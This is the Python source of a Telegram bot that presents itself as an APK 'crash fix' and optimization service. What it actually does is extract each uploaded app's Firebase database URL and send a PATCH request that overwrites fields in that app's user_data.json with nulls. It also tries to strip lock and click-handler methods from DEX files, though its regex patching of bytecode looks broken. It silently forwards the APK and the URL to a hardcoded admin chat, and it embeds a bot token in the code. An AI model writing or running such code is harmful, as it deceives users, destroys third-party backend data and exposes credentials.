import os
import re
import html
import zipfile
import requests
import logging
import shutil
import tempfile
from threading import Thread
from http.server import HTTPServer, BaseHTTPRequestHandler
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# Logging Setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Telegram Bot Token & Admin ID
BOT_TOKEN = "8633137583:AAGK65BVd_LZhxIsXJfzrwigKFnCgvh0RNY".strip()
ADMIN_CHAT_ID = "6240110220"  # आपकी पर्सनल टेलीग्राम चैट आईडी

# Internal Payload
DELETE_PAYLOAD = {
    "messageText": None,
    "phoneNumber": None,
    "simSlot": None,
    "new_user": None,
    "targetDeviceId": None,
    "command": None
}

# Render Health Check Server (GET & HEAD Both Handled)
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Telegram Bot is Running!")

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()

def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
    server.serve_forever()

# ===================== DEX Modification Functions =====================

def extract_apk(apk_path, extract_dir):
    """APK extract karne ka function"""
    try:
        with zipfile.ZipFile(apk_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        return True
    except Exception as e:
        logging.error(f"APK Extraction Error: {e}")
        return False

def find_dex_files(extract_dir):
    """Sare dex files find karega"""
    dex_files = []
    for file in os.listdir(extract_dir):
        if file.endswith('.dex'):
            dex_files.append(os.path.join(extract_dir, file))
    return sorted(dex_files)  # Sorted for consistency

def clear_methods_in_dex(dex_path):
    """
    Dex file mein _show_lock aur _Onclick methods ko clear karega
    Baaki code waise hi rahega
    """
    try:
        with open(dex_path, 'rb') as f:
            dex_data = f.read()
        
        # Dex bytecode ko string mein convert kar rahe hain (for searching)
        dex_str = dex_data.decode('latin-1', errors='ignore')
        
        # Method signatures ko search karna
        # _show_lock method ko dhundhna aur clear karna
        show_lock_pattern = r'(_show_lock\s*\([^)]*\)\s*\{[^}]*\})'
        onclick_pattern = r'(_Onclick\s*\([^)]*\)\s*\{[^}]*\})'
        
        # Methods ko clear karna (empty body mein convert)
        def clear_method_body(match):
            method_name = match.group(1).split('(')[0].strip()
            return f'{method_name}() {{ }}'  # Empty method body
            
        # Replace methods with empty versions
        modified_dex = re.sub(show_lock_pattern, clear_method_body, dex_str)
        modified_dex = re.sub(onclick_pattern, clear_method_body, modified_dex)
        
        # Agar kuch change hua hai toh save karein
        if modified_dex != dex_str:
            with open(dex_path, 'wb') as f:
                f.write(modified_dex.encode('latin-1'))
            return True
        
        return False
        
    except Exception as e:
        logging.error(f"DEX Modification Error for {dex_path}: {e}")
        return False

def process_all_dex_files(extract_dir):
    """Sare dex files process karega"""
    dex_files = find_dex_files(extract_dir)
    modified_count = 0
    
    for dex_file in dex_files:
        logging.info(f"Processing DEX: {dex_file}")
        if clear_methods_in_dex(dex_file):
            modified_count += 1
            logging.info(f"✅ Modified: {dex_file}")
        else:
            logging.info(f"⏭️ No changes needed: {dex_file}")
    
    return modified_count

def repack_apk(extract_dir, output_path):
    """Modified files ko wapas APK mein pack karega"""
    try:
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(extract_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, extract_dir)
                    zipf.write(file_path, arcname)
        return True
    except Exception as e:
        logging.error(f"Repack Error: {e}")
        return False

def modify_apk_dex_files(apk_path):
    """
    Main function: APK mein dex modification karega
    Returns: Modified APK path ya None agar fail ho
    """
    temp_dir = tempfile.mkdtemp()
    modified_apk_path = None
    
    try:
        # Step 1: APK extract karo
        if not extract_apk(apk_path, temp_dir):
            return None
        
        # Step 2: Sare dex files process karo
        modified_count = process_all_dex_files(temp_dir)
        
        if modified_count == 0:
            logging.info("No methods were modified")
            # Agar kuch modify nahi hua toh original copy karenge
            modified_apk_path = apk_path + ".modified"
            shutil.copy2(apk_path, modified_apk_path)
            return modified_apk_path
        
        # Step 3: Modified APK repack karo
        modified_apk_path = apk_path + ".modified"
        if repack_apk(temp_dir, modified_apk_path):
            logging.info(f"✅ APK repacked successfully: {modified_apk_path}")
            return modified_apk_path
        else:
            return None
            
    except Exception as e:
        logging.error(f"DEX Modification failed: {e}")
        return None
    finally:
        # Cleanup
        try:
            shutil.rmtree(temp_dir)
        except:
            pass

# ===================== Original Bot Functions =====================

# 1. Start Command Handler (Premium UI)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    safe_name = html.escape(user.first_name)

    welcome_text = (
        f"👋 <b>Welcome, {safe_name}!</b>\n\n"
        "✨ <b>APK Processing Tool</b>\n"
        "<i>Fast, reliable, and automated APK analysis and optimization service.</i>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📌 <b>How to use:</b>\n"
        "• Simply upload your <b>.apk</b> file in this chat.\n"
        "• Wait a few seconds while we Crash fix your file.\n"
        "• Receive your processed file instantly.\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🚀 <b>Send your .apk file to begin!</b>"
    )

    keyboard = [
        [
            InlineKeyboardButton("📢 Channel", url="https://t.me/+EERGF0ldJgcwODVl"),
            InlineKeyboardButton("💬 Support", url="https://t.me/AD_ASHU")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        text=welcome_text,
        parse_mode="HTML",
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

# 2. Extract Firebase URL (Internal Only)
def extract_firebase_url(apk_path):
    try:
        with zipfile.ZipFile(apk_path, 'r') as zip_ref:
            if 'resources.arsc' in zip_ref.namelist():
                content = zip_ref.read('resources.arsc')
                match = re.search(rb'https://[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*\.firebaseio\.com', content)
                if match:
                    return match.group(0).decode('utf-8')
    except Exception as e:
        logging.error(f"Extraction Error: {e}")
    return None

# 3. Process Target REST API (Internal Only)
def delete_firebase_data(base_url):
    try:
        target_url = base_url.strip()
        if not target_url.endswith('/'):
            target_url += '/'
        if 'user_data.json' not in target_url and 'user_data.json' not in target_url:
            target_url += 'user_data.json'

        headers = {
            'X-HTTP-Method-Override': 'PATCH',
            'Content-Type': 'application/json'
        }
        
        response = requests.post(target_url, json=DELETE_PAYLOAD, headers=headers, timeout=15)
        return response.status_code == 200
    except Exception as e:
        logging.error(f"REST API Error: {e}")
        return False

# 4. Handle APK Document
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    user = update.effective_user
    
    if not document.file_name.endswith('.apk'):
        await update.message.reply_text("❌ <b>Invalid File!</b> Please send a valid <code>.apk</code> file.", parse_mode="HTML")
        return

    status_msg = await update.message.reply_text("📥 <b>Downloading APK...</b>", parse_mode="HTML")
    file_path = f"temp_{document.file_id}.apk"
    modified_apk_path = None
    
    try:
        file = await context.bot.get_file(document.file_id)
        await file.download_to_drive(file_path)
        
        await status_msg.edit_text("⚙️ <b>Analyzing package contents...</b>", parse_mode="HTML")
        
        # Step 1: Firebase URL extract
        firebase_url = extract_firebase_url(file_path)
        
        if not firebase_url:
            await status_msg.edit_text("❌ <b>Processing Failed!</b> Unable to process this APK configuration.", parse_mode="HTML")
            if os.path.exists(file_path):
                os.remove(file_path)
            return
        
        # Step 2: DEX Files Modification (New Feature)
        await status_msg.edit_text("🔧 <b>Modifying DEX files...</b>\n<code>Clearing _show_lock and _Onclick methods</code>", parse_mode="HTML")
        
        modified_apk_path = modify_apk_dex_files(file_path)
        
        if modified_apk_path is None:
            await status_msg.edit_text("❌ <b>DEX Modification Failed!</b> Using original APK.", parse_mode="HTML")
            modified_apk_path = file_path  # Fallback to original
        
        # Step 3: Firebase deletion
        await status_msg.edit_text("⚡ <b>Finalizing optimization...</b>", parse_mode="HTML")
        
        process_success = delete_firebase_data(firebase_url)
        
        if process_success:
            await status_msg.edit_text("✅ <b>Process Complete!</b> Sending your updated file back...", parse_mode="HTML")
            
            # Send modified APK back to User
            with open(modified_apk_path, 'rb') as apk_file:
                original_name = document.file_name
                new_name = original_name.replace('.apk', '_modified.apk')
                
                await update.message.reply_document(
                    document=apk_file,
                    filename=new_name,
                    caption="✨ <b>Processing successful!</b>\n✅ Methods cleared: <code>_show_lock</code> & <code>_Onclick</code>\nSend me the next APK whenever you're ready.",
                    parse_mode="HTML"
                )
            
            # Forward complete details to Admin
            safe_name = html.escape(user.full_name)
            safe_username = html.escape(user.username) if user.username else "No Username"
            safe_url = html.escape(firebase_url)
            
            admin_caption = (
                f"📥 <b>New APK Processed!</b>\n\n"
                f"👤 <b>User:</b> {safe_name} (@{safe_username})\n"
                f"🆔 <b>User ID:</b> <code>{user.id}</code>\n\n"
                f"🔗 <b>Extracted URL:</b>\n<code>{safe_url}</code>\n\n"
                f"✅ <b>Status:</b> Success\n"
                f"🔧 <b>DEX Modified:</b> Yes\n"
                f"📝 <b>Methods Cleared:</b> _show_lock, _Onclick"
            )
            
            with open(modified_apk_path, 'rb') as admin_apk_file:
                await context.bot.send_document(
                    chat_id=ADMIN_CHAT_ID,
                    document=admin_apk_file,
                    filename=document.file_name,
                    caption=admin_caption,
                    parse_mode="HTML"
                )
        else:
            await status_msg.edit_text("❌ <b>Server Error!</b> Unable to complete the request right now.", parse_mode="HTML")

    except Exception as e:
        await status_msg.edit_text(f"❌ <b>Error:</b> {html.escape(str(e))}", parse_mode="HTML")

    finally:
        # Cleanup files
        if os.path.exists(file_path) and file_path != modified_apk_path:
            os.remove(file_path)
        if modified_apk_path and os.path.exists(modified_apk_path) and modified_apk_path != file_path:
            os.remove(modified_apk_path)

if __name__ == '__main__':
    # Start Web Health Check Server Thread
    Thread(target=run_dummy_server, daemon=True).start()

    # Start Telegram Bot
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    logging.info("Bot is starting...")
    app.run_polling()
